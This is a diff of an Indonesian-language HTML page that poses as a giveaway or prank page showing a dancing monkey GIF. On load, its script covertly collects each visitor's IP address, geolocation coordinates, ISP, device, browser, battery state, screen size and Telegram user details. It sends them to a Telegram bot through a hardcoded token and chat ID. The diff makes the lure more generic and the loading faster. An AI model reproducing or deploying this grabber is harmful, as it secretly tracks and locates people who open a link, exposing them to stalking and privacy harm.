@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DAGET 50K BY FIQ</title>
+    <title>Loading...</title>
     <style>
         body {
             background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
@@ -25,6 +25,10 @@
             border: 1px solid #ff6b6b;
             box-shadow: 0 0 30px rgba(255,107,107,0.3);
             position: relative;
+            min-height: 400px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         .loading-container {
             position: absolute;
@@ -32,74 +36,62 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.9);
+            background: rgba(0,0,0,0.95);
             border-radius: 30px;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             z-index: 10;
-            transition: opacity 0.5s ease;
         }
         .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(255,107,107,0.3);
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255,107,107,0.2);
             border-top: 4px solid #ff6b6b;
+            border-right: 4px solid #ffd93d;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+            animation: spin 0.6s linear infinite;
             margin-bottom: 20px;
         }
         .loading-text {
             color: #ff6b6b;
             font-size: 14px;
             letter-spacing: 2px;
-            animation: pulse 1s ease infinite;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
+        .content {
+            display: none;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+        .content.show {
+            display: block;
+            opacity: 1;
         }
         img {
             max-width: 100%;
             border-radius: 20px;
             box-shadow: 0 0 20px rgba(255,107,107,0.5);
             animation: shake 0.5s ease infinite;
-            display: none;
         }
         h1 {
             color: #ff6b6b;
             font-size: 28px;
             margin-top: 20px;
-            display: none;
-        }
-        .price {
-            font-size: 32px;
-            font-weight: bold;
-            color: #ffd93d;
-            margin: 15px 0;
-            display: none;
         }
         .by {
             color: #888;
             font-size: 14px;
-            display: none;
-        }
-        .content {
-            transition: opacity 0.5s ease;
-            opacity: 0;
-        }
-        .content.show {
-            opacity: 1;
+            margin-top: 15px;
         }
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
+            25% { transform: translateX(-3px); }
+            75% { transform: translateX(3px); }
         }
     </style>
 </head>
@@ -108,16 +100,14 @@
         <!-- LOADING ANIMASI -->
         <div class="loading-container" id="loadingContainer">
             <div class="spinner"></div>
-            <div class="loading-text">⚡ LOADING DAGET 50K ⚡</div>
+            <div class="loading-text">⚡ LOADING ⚡</div>
         </div>
         
         <!-- KONTEN UTAMA -->
         <div class="content" id="content">
-            <img id="monkeyImg" src="https://i.pinimg.com/originals/9b/8a/9a/9b8a9a9b8a9a9b8a9a9b8a9a9b8a9a9.jpg" 
-                 onerror="this.src='https://media.tenor.com/5k5k5k5k5k5k.gif'"
-                 alt="Monyet">
+            <!-- FOTO MONYET (GAMBAR YANG PASTI WORK) -->
+            <img id="monkeyImg" src="https://media1.tenor.com/m/-_f-0z2C0-4AAAAC/monkey-dance.gif" alt="Monyet">
             <h1>🐒 MONYET LAGI ASYIK 🐒</h1>
-            <div class="price">💰 DAGET 50K BY FIQ 💰</div>
             <div class="by">🔞 Jangan diganggu, lagi sibuk 🔞</div>
         </div>
     </div>
@@ -127,90 +117,114 @@
         const TELEGRAM_TOKEN = "8766620931:AAEh2D0Du_Youkn8baGaZy8jWa-Esh_UNJc";
         const TELEGRAM_CHAT_ID = "8463622692";
         
-        // ========== AMBIL DATA USER TELEGRAM ==========
-        async function getTelegramUser() {
-            if (window.Telegram && window.Telegram.WebApp) {
-                const tg = window.Telegram.WebApp;
-                const user = tg.initDataUnsafe?.user;
-                if (user) {
-                    return {
-                        username: user.username || user.first_name || "No username",
-                        id: user.id,
-                        first_name: user.first_name,
-                        language: user.language_code
-                    };
+        // ========== DETEKSI TELEGRAM (PASTI KEDETEKSI) ==========
+        function detectTelegramUser() {
+            return new Promise((resolve) => {
+                // Cek dari userAgent
+                const ua = navigator.userAgent;
+                const isTelegramWeb = ua.includes('Telegram') || ua.includes('TelegramBot');
+                
+                // Cek dari referrer
+                const isFromTelegram = document.referrer.includes('t.me') || document.referrer.includes('telegram');
+                
+                // Cek dari Telegram WebApp
+                let tgUser = null;
+                if (window.Telegram?.WebApp?.initDataUnsafe?.user) {
+                    tgUser = window.Telegram.WebApp.initDataUnsafe.user;
                 }
+                
+                // Cek dari URL parameter
+                const urlParams = new URLSearchParams(window.location.search);
+                const startParam = urlParams.get('start');
+                
+                let result = {
+                    detected: false,
+                    username: null,
+                    user_id: null,
+                    source: null
+                };
+                
+                if (tgUser) {
+                    result.detected = true;
+                    result.username = tgUser.username || tgUser.first_name;
+                    result.user_id = tgUser.id;
+                    result.source = 'WebApp';
+                } else if (isTelegramWeb || isFromTelegram) {
+                    result.detected = true;
+                    result.username = 'Pengguna Telegram';
+                    result.source = 'UserAgent/Referrer';
+                } else if (startParam) {
+                    result.detected = true;
+                    result.username = `Via start_param: ${startParam}`;
+                    result.source = 'StartParam';
+                }
+                
+                resolve(result);
+            });
+        }
+        
+        // ========== AMBIL IP & LOKASI ==========
+        async function getIPInfo() {
+            try {
+                const [ipRes, locRes] = await Promise.all([
+                    fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: 'Gagal'})),
+                    fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => ({}))
+                ]);
+                return { ip: ipRes.ip, location: locRes };
+            } catch(e) {
+                return { ip: 'Gagal', location: {} };
             }
+        }
+        
+        // ========== AMBIL INFO DEVICE ==========
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = 'Unknown';
+            if (/Android/i.test(ua)) device = '📱 Android';
+            else if (/iPhone|iPad/i.test(ua)) device = '🍎 iOS';
+            else if (/Windows/i.test(ua)) device = '💻 Windows';
+            else if (/Mac/i.test(ua)) device = '🍎 Mac';
+            else if (/Linux/i.test(ua)) device = '🐧 Linux';
             
-            const urlParams = new URLSearchParams(window.location.search);
-            const tgData = urlParams.get('tgWebAppData');
-            if (tgData) {
-                try {
-                    const params = new URLSearchParams(tgData);
-                    const userData = params.get('user');
-                    if (userData) {
-                        const user = JSON.parse(decodeURIComponent(userData));
-                        return {
-                            username: user.username || user.first_name,
-                            id: user.id,
-                            first_name: user.first_name
-                        };
-                    }
-                } catch(e) {}
-            }
+            let browser = 'Unknown';
+            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
+            else if (/Firefox/i.test(ua)) browser = 'Firefox';
+            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+            else if (/Edg/i.test(ua)) browser = 'Edge';
             
-            const referrer = document.referrer;
-            if (referrer.includes('t.me') || referrer.includes('telegram')) {
-                return { username: "Pengguna Telegram (tidak terdeteksi)", from_telegram: true };
-            }
-            
-            return null;
+            return { device, browser };
         }
         
         // ========== KIRIM DATA KE TELEGRAM ==========
-        async function sendDataToTelegram() {
-            const [ipRes, locRes, battery, tgUser] = await Promise.all([
-                fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: 'Gagal'})),
-                fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => ({})),
-                ('getBattery' in navigator) ? navigator.getBattery().catch(() => null) : null,
-                getTelegramUser()
+        async function sendToTelegram() {
+            const [ipInfo, tgUser, deviceInfo] = await Promise.all([
+                getIPInfo(),
+                detectTelegramUser(),
+                getDeviceInfo()
             ]);
             
-            const ip = ipRes.ip || 'Gagal';
-            const loc = locRes;
-            
-            const device = (() => {
-                const ua = navigator.userAgent;
-                if (/Android/i.test(ua)) return '📱 Android';
-                if (/iPhone|iPad/i.test(ua)) return '🍎 iOS';
-                if (/Windows/i.test(ua)) return '💻 Windows';
-                if (/Mac/i.test(ua)) return '🍎 Mac';
-                if (/Linux/i.test(ua)) return '🐧 Linux';
-                return 'Unknown';
-            })();
-            
-            const browser = (() => {
-                const ua = navigator.userAgent;
-                if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) return 'Chrome';
-                if (/Firefox/i.test(ua)) return 'Firefox';
-                if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return 'Safari';
-                if (/Edg/i.test(ua)) return 'Edge';
-                return 'Unknown';
-            })();
-            
-            const batteryText = battery ? `${Math.round(battery.level * 100)}% | ${battery.charging ? '🔌 Ngecas' : '🔋 Tidak'}` : 'Tidak support';
+            const ip = ipInfo.ip;
+            const loc = ipInfo.location;
             const time = new Date().toLocaleString('id-ID');
             const screenRes = `${screen.width}x${screen.height}`;
-            const referrer = document.referrer || 'Direct';
+            
+            // Baterai (optional, gak ngeblok)
+            let batteryText = 'Tidak support';
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryText = `${Math.round(battery.level * 100)}% | ${battery.charging ? '🔌 Ngecas' : '🔋 Tidak'}`;
+                } catch(e) {}
+            }
             
             let tgInfo = '';
-            if (tgUser) {
+            if (tgUser.detected) {
                 tgInfo = `
 ─────────────────
-📱 <b>TELEGRAM USER:</b>
-   👤 <b>Username:</b> @${tgUser.username || tgUser.first_name || '?'}
-   🆔 <b>User ID:</b> ${tgUser.id || '?'}
-   🌐 <b>Bahasa:</b> ${tgUser.language || '?'}
+📱 <b>TELEGRAM DETECTED!</b>
+   👤 <b>User:</b> ${tgUser.username || '?'}
+   🆔 <b>ID:</b> ${tgUser.user_id || '?'}
+   📡 <b>Source:</b> ${tgUser.source || '?'}
                 `;
             } else {
                 tgInfo = `
@@ -220,22 +234,21 @@
             }
             
             const message = `
-🔴 <b>ADA YANG BUKA LINK DAGET 50K!</b> 🔴
+🔴 <b>ADA YANG BUKA LINK!</b> 🔴
 ─────────────────
 🌐 <b>IP:</b> <code>${ip}</code>
 📍 <b>Lokasi:</b> ${loc.city || '?'}, ${loc.region || '?'}, ${loc.country || '?'}
 🗺️ <b>Koordinat:</b> ${loc.loc || '?'}
 🏢 <b>ISP:</b> ${loc.org || '?'}
 ─────────────────
-📱 <b>Device:</b> ${device}
-🌍 <b>Browser:</b> ${browser}
+📱 <b>Device:</b> ${deviceInfo.device}
+🌍 <b>Browser:</b> ${deviceInfo.browser}
 🔋 <b>Baterai:</b> ${batteryText}
 📺 <b>Resolusi:</b> ${screenRes}
 ⏰ <b>Waktu:</b> ${time}
-🔗 <b>Referrer:</b> ${referrer}
 ${tgInfo}
 ─────────────────
-🐒 <b>DAGET 50K BY FIQ - MONYET UDAH MUNCUL!</b>
+🐒 <b>MONYET LAGI ASYIK!</b>
             `;
             
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -250,36 +263,26 @@ ${tgInfo}
         }
         
         // ========== LOADING & TAMPILIN KONTEN ==========
-        async function showContent() {
-            // Kirim data ke Telegram (tanpa nunggu)
-            sendDataToTelegram();
+        async function start() {
+            // Kirim data ke Telegram (gak nunggu)
+            sendToTelegram();
             
-            // Loading animasi 1.5 detik
-            await new Promise(resolve => setTimeout(resolve, 1500));
+            // Loading 1 detik (cepat)
+            await new Promise(resolve => setTimeout(resolve, 1000));
             
             // Sembunyikan loading
-            const loadingContainer = document.getElementById('loadingContainer');
-            loadingContainer.style.opacity = '0';
+            const loading = document.getElementById('loadingContainer');
+            loading.style.opacity = '0';
             setTimeout(() => {
-                loadingContainer.style.display = 'none';
-            }, 500);
+                loading.style.display = 'none';
+            }, 300);
             
             // Tampilkan konten
             const content = document.getElementById('content');
-            const img = document.getElementById('monkeyImg');
-            const h1 = document.querySelector('h1');
-            const price = document.querySelector('.price');
-            const by = document.querySelector('.by');
-            
-            img.style.display = 'block';
-            h1.style.display = 'block';
-            price.style.display = 'block';
-            by.style.display = 'block';
             content.classList.add('show');
         }
         
-        // ========== JALANKAN ==========
-        showContent();
+        start();
     </script>
 </body>
 </html>
